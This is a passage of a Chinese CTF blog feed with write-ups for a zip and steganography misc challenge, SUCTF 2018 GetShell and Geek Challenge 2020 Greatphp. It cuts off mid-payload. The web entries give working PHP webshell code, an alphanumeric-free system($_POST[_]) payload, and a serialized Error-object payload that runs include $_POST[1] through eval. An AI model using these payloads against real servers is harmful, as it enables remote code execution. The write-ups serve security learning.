class="hljs-operator">-</span><span class="hljs-variable">p</span> <span class="hljs-variable">secret</span><span class="hljs-operator">.</span><span class="hljs-variable">txt</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/23/ybx4SM7QNpPejmv.png" alt="image-20230423174819872"></p><p>爆出来3个key，用这些key去产生一个新的压缩包，密码自己设置：</p><figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mathematica"><span class="hljs-variable">bkcrack</span> <span class="hljs-operator">-</span><span class="hljs-built_in">C</span> <span class="hljs-built_in">Plain</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span> <span class="hljs-operator">-</span><span class="hljs-variable">c</span> <span class="hljs-string">&quot;secret.txt&quot;</span> <span class="hljs-operator">-</span><span class="hljs-variable">k</span> <span class="hljs-variable">ec437a15</span> <span class="hljs-variable">db89e36d</span> <span class="hljs-variable">cd3e8e15</span> <span class="hljs-operator">-</span><span class="hljs-variable">U</span> <span class="hljs-variable">flag</span><span class="hljs-operator">.</span><span class="hljs-variable">zip</span> <span class="hljs-number">123</span><br></code></pre></td></tr></table></figure><p>我们使用 <code>-U 参数</code> 生成了一个新的flag.zip压缩包，密码123：</p><p>使用密码打开 <code>flag.txt</code></p><p><img src="https://s2.loli.net/2023/04/23/KhmEnls6vfUA9Jy.png" alt="image-20230423175025410"></p><h4 id="SuperMisc"><a href="#SuperMisc" class="headerlink" title="SuperMisc"></a>SuperMisc</h4><p>打开文件夹，发现存在 <code>.git</code> 文件夹，说明使用了git，我们<code>git log</code>查看一下日志：</p><p><img src="https://s2.loli.net/2023/04/24/d4aDEFOrGCnI2Bc.png" alt="image-20230424111856953"></p><p>发现存在提交记录，于是我们切换到第二次提交的时候：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">git <span class="hljs-keyword">reset</span> <span class="hljs-comment">--hard e9286d88c95ab6411b323dca8f358abc3a7e204f</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/24/2gQl7wZbHjv3Kcn.png" alt="image-20230424112004591"></p><p>发现多了一个压缩包 <code>Vigenere.zip</code>,但是不知道密码，于是我们使用010打开png图片：</p><p><img src="https://s2.loli.net/2023/04/24/6CNQvSDTL7zhA3e.png" alt="image-20230424112124160"></p><p>发现很多 0、1的二进制数据，我们把它提取出来放到 <code>data.txt</code>中：</p><p><img src="https://s2.loli.net/2023/04/24/QpPNzuAmXBrG6lS.png" alt="image-20230424112233522"></p><p>我们猜测这可能需要使用这些0、1组成图片：</p><p>于是我们写个脚本将这些16进制的转化为普通的文本文件<code>out.txt</code>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/data.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>fw = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/out.txt&quot;</span>, <span class="hljs-string">&quot;w&quot;</span>)<br>s = <span class="hljs-string">&quot;&quot;</span><br>data = f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data:<br>    ch = <span class="hljs-string">&quot;%02x&quot;</span> % i<br>    s += ch<br><br>fw.write(s)<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/04/24/1ymDXsz8wGaQ9AM.png" alt="image-20230424112501328"></p><p>然后使用python脚本将01转化为图片：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>fr = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;C://Users/LIKE/Desktop/out.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)<br>data = fr.read()<br><br>img = Image.new(<span class="hljs-string">&quot;RGB&quot;</span>, (<span class="hljs-number">1150</span>, <span class="hljs-number">1150</span>))<br><br><span class="hljs-comment"># print(data)</span><br>i = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1150</span>):<br>    <span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1150</span>):<br>        <span class="hljs-keyword">if</span> data[i] == <span class="hljs-string">&quot;1&quot;</span>:<br>            img.putpixel((x, y), (<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br>        <span class="hljs-keyword">elif</span> data[i] == <span class="hljs-string">&quot;0&quot;</span>:<br>            img.putpixel((x, y), (<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>))<br>        i += <span class="hljs-number">1</span><br><br>img.show()<br>img.save(<span class="hljs-string">&quot;flag.png&quot;</span>)<br></code></pre></td></tr></table></figure><img src="https://s2.loli.net/2023/04/24/YElLXTxviS9On6a.png" alt="flag" style="zoom: 25%;" /><p>扫描二维码：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">11000</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">01111</span>#<span class="hljs-number">11000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">01111</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11110</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00001</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11110</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00111</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11100</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11111</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">11110</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">10000</span>#<span class="hljs-number">00011</span>#<span class="hljs-number">00000</span><br></code></pre></td></tr></table></figure><p>使用 0、1、#  3中字符组成，猜测这应该是莫斯密码：</p><img src="https://s2.loli.net/2023/04/24/nN4T6iSy9M3DHCY.png" alt="image-20230424112703479" style="zoom:33%;" /><p>然后将16进制转为字符串：</p><p><img src="https://s2.loli.net/2023/04/24/E7ZV2Hvc1bNsSoq.png" alt="image-20230424112728145"></p><p>获得压缩包密码，解密获得 <code>Vigenere</code> 文件：</p><p>我们使用 <code>file</code>命令查看一下是什么文件：</p><p><img src="https://s2.loli.net/2023/04/24/rJQ4NvpdW2qw7bz.png" alt="image-20230424113112354"></p><p>在010中打开得到字符串：</p><p><img src="https://s2.loli.net/2023/04/24/idZaephToUvDLnk.png" alt="image-20230424113413288"></p><p>或者 <code>strings</code>：</p><p><img src="https://s2.loli.net/2023/04/24/wJNdqZlxGfjOgnM.png" alt="image-20230424113438992"></p><p>然后结合文件名，知道是<code>维吉尼亚密码</code>，但是需要密钥</p><p><a href="https://github.com/Byxs20/Vigenere-Tools">使用大佬脚本根据明文爆破密钥</a></p><p><img src="https://s2.loli.net/2023/04/24/9b837dPALXVORsz.png" alt="image-20230424114943236"></p><p>获得密钥 <code>IBFQW</code>:</p><p><img src="https://s2.loli.net/2023/04/24/oOVudAp26UGvFlM.png" alt="image-20230424115032601"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HDCTF2023</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>GetShell</title>
    <link href="/2023/08/24/GetShell/"/>
    <url>/2023/08/24/GetShell/</url>
    
    <content type="html"><![CDATA[<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><p>文件上传题目</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142133986.png" alt="image-20230414213323837"></p><p>发现在第五个之后，会对字符进行过滤，我们上传的时候抓包：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304151523798.png" alt="image-20230414213747146"></p><p>经过测试，发现字母、数字都被过滤了。典型的无字母数字webshell</p><p><code>+ | ^ % &gt; &lt; &#39;</code> 等字符被过滤了，所以我们只能使用取反 <code>~</code> 绕过</p><p>测试得知，中文不会被绕过，所以我们需要使用中文取反</p><p>这里总结一下使用中文取反的汉字：</p><p><img src="https://raw.githubusercontent.com/leekosss/photoBed/master/202304142232472.jpeg" alt="14872686600768.jpg"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;区&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;冈&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;勺&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;皮&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;针&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-comment">// system</span><br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;码&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;寸&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;小&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;欠&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-keyword">echo</span> ~<span class="hljs-string">&quot;立&quot;</span>[<span class="hljs-number">1</span>].PHP_EOL;<br><span class="hljs-comment">// _POST</span><br></code></pre></td></tr></table></figure><p>根据以上这些汉字，我们就可以构造出我们想要的命令执行了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[]; <span class="hljs-comment">//array</span><br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>; <span class="hljs-comment">//arrayarray</span><br><span class="hljs-variable">$_</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-comment">//$_=(array==arrayarray)明显不相同 false 0</span><br><span class="hljs-variable">$__</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-comment">//$__=(array==array) 相同返回1</span><br><br><span class="hljs-variable">$____</span> = ~区[<span class="hljs-variable">$__</span>].~冈[<span class="hljs-variable">$__</span>].~区[<span class="hljs-variable">$__</span>].~勺[<span class="hljs-variable">$__</span>].~皮[<span class="hljs-variable">$__</span>].~针[<span class="hljs-variable">$__</span>];<span class="hljs-comment">//system</span><br><span class="hljs-variable">$___</span> = ~码[<span class="hljs-variable">$__</span>].~寸[<span class="hljs-variable">$__</span>].~小[<span class="hljs-variable">$__</span>].~欠[<span class="hljs-variable">$__</span>].~立[<span class="hljs-variable">$__</span>];<span class="hljs-comment">//_POST</span><br><br><br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$$__</span>[_]);<span class="hljs-comment">//也就是system($_POST[_])</span><br><br></code></pre></td></tr></table></figure><p>payload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-variable">$_</span>=[];<span class="hljs-variable">$__</span>=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<span class="hljs-variable">$_</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$__</span>);<span class="hljs-variable">$__</span>=(<span class="hljs-variable">$_</span>==<span class="hljs-variable">$_</span>);<span class="hljs-variable">$___</span>=~区[<span class="hljs-variable">$__</span>].~冈[<span class="hljs-variable">$__</span>].~区[<span class="hljs-variable">$__</span>].~勺[<span class="hljs-variable">$__</span>].~皮[<span class="hljs-variable">$__</span>].~针[<span class="hljs-variable">$__</span>];<span class="hljs-variable">$____</span>=~码[<span class="hljs-variable">$__</span>].~寸[<span class="hljs-variable">$__</span>].~小[<span class="hljs-variable">$__</span>].~欠[<span class="hljs-variable">$__</span>].~立[<span class="hljs-variable">$__</span>];<span class="hljs-variable">$___</span>(<span class="hljs-variable">$$____</span>[_]);<br></code></pre></td></tr></table></figure><p>直接蚁剑连接即可</p><p><a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">无字母数字webshell</a></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GetShell</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Greatphp</title>
    <link href="/2023/08/24/Greatphp/"/>
    <url>/2023/08/24/Greatphp/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h2 id="极客大挑战-2020-Greatphp"><a href="#极客大挑战-2020-Greatphp" class="headerlink" title="[极客大挑战 2020]Greatphp"></a>[极客大挑战 2020]Greatphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )&#123;<br>           <span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125; <span class="hljs-keyword">else</span> &#123;<br>               <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Try Hard !!&quot;</span>);<br>           &#125;<br>           <br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;great&#x27;</span>]);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>分析一下知道这是反序列化的题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( (<span class="hljs-variable language_">$this</span>-&gt;syc != <span class="hljs-variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;syc) === <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;syc)=== <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;lover)) )<br></code></pre></td></tr></table></figure><p>这里需要使md5、sha1值相等，但是两个变量不同</p><p>如果是普通变量的话，我们可以选择数组进行绕过。但这里是在类中，我们不能这么做</p><p>我们需要知道，<strong>md5()、sha1()函数可以触发类的<code>__toString()</code> 方法</strong>，这是重点</p><p>因此，我们只需要让对象的<code>__toString()</code>返回值相等即可绕过</p><p>这里要用到<strong>php内置类</strong> ： Error、Exception。这两个类都带有<code>__toString()</code>方法</p><img src="https://s2.loli.net/2023/05/29/xS4tP2qV8aQUhHf.png" alt="image-20230529113202635" style="zoom:50%;" /><p>我们测试一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;A&quot;</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-string">&quot;B&quot;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>.PHP_EOL.PHP_EOL;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/05/29/7afuOWGbe6kSqNH.png" alt="image-20230529113334552"></p><p>发现只有两个地方不同：A、B 和 5、6</p><p>A、B我们可以控制传入相同的payload让其相等，但是5、6是什么意思呢—–行号</p><p>我们只需要将定义两个异常类对象写在一行即可：</p><p><img src="https://s2.loli.net/2023/05/29/XRABc1Pq3r4jNke.png" alt="image-20230529113854962"></p><p>这样乍一看是相等了，但是我们要注意，这样<strong>两个对象是相等</strong>的：</p><p><img src="https://s2.loli.net/2023/05/29/EfvwGRXbOz21nxg.png" alt="image-20230529113831194"></p><p>我们需要了解一下Exception 构造方法的形参有一个异常代码</p><img src="https://s2.loli.net/2023/05/29/8pSqnMbm9uI4jBQ.png" alt="image-20230529114134470" style="zoom: 50%;" /><p>当我们设置的值不同时，对象也就不同了</p><img src="https://s2.loli.net/2023/05/29/ExyP3HuKTLXws15.png" alt="image-20230529114225974" style="zoom: 67%;" /><p>由此，我们突破了第一重限制，接下来分析：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="hljs-variable">$this</span>-&gt;syc, <span class="hljs-variable">$match</span>))&#123;<br>               <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;syc);<br>           &#125;<br></code></pre></td></tr></table></figure><blockquote><p>如果我们的 <code>$this-&gt;syc</code> 是一个<code>Exception</code>对象的话，由于进行了正则匹配，所以也会触发 <code>__toString()</code>方法</p></blockquote><p>我们不能让payload存在 <code>&lt;?php</code> 、<code>()</code> <code>&quot;</code> <code>&#39;</code></p><p>但是此时php版本是7，不能用 : <code>&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</code> 写法</p><p>我们可以用：<code>&lt;?= ?&gt;</code> 的格式</p><p>这个格式<code>隐含echo</code>， <code>&lt;?=1?&gt;</code> 就相当于<code>echo 1</code></p><img src="https://s2.loli.net/2023/05/29/pnBtgKHGVZaylco.png" alt="image-20230529120453218" style="zoom:50%;" /><p>把小括号()过滤了，不能调用函数了，</p><p>但是我们可以使用 <code>include</code> 这种不需要括号也能调用的</p><p>于是我们可以：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span> <span class="hljs-variable">$_POST</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SYCLOVER</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$syc</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$lover</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$syc</span>,<span class="hljs-variable">$lover</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;syc = <span class="hljs-variable">$syc</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;lover = <span class="hljs-variable">$lover</span>;<br>    &#125;<br><br>&#125;<br><span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;?&gt;&lt;?=include $_POST[1]?&gt;&#x27;</span>;<br><span class="hljs-variable">$syc</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">1</span>);<span class="hljs-variable">$lover</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Error</span>(<span class="hljs-variable">$str</span>,<span class="hljs-number">2</span>);<br><span class="hljs-variable">$s</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">SYCLOVER</span>(<span class="hljs-variable">$syc</span>,<span class="hljs-variable">$lover</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>));<br><br>O%<span class="hljs-number">3</span>A8%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>SYCLOVER%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A2%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A3%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>syc%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>BO%<span class="hljs-number">3</span>A5%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>Bs%<span class="hljs-number">3</span>A10%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>message%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A24%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>Dinclude+%<span class="hljs-number">24</span>_POST%<span class="hljs-number">5</span>B1%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A13%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span><span class="hljs-built_in">Error</span>%<span class="hljs-number">00</span><span class="hljs-keyword">string</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A0%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>code%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bi%<span class="hljs-number">3</span>A1%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>%<span class="hljs-number">2</span>A%<span class="hljs-number">00</span>file%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A87%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>D%<span class="hljs-number">3</span>A%<span class="hljs-number">5</span>CApplications%<span class="hljs-number">5</span>CCTF%<span class="hljs-number">5</span>Cphpstudy_pro%<span class="hljs-number">5</span>CWWW%<span class="hljs-number">5</span>CCTF%<span class="hljs-number">5</span>Cbuuctf%<span class="hljs-number">5</span>Cweb4%<span class="hljs-number">5</span>C%<span class="hljs-number">5</span>B%E6%<span class="hljs-number">9</span>E%<span class="hljs-number">81</span>%E5%AE%A2%E5%A4%A7%E6%<span class="hljs-number">8</span>C%<span class="hljs-number">91</span>%E6%<span class="hljs-number">88</span>%<span class="hljs-number">98</span>+<span class="hljs-number">2020</span>%<span class="hljs-number">5</span>DGreatphp.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A7%<span class="hljs-number">3</span>A%<span 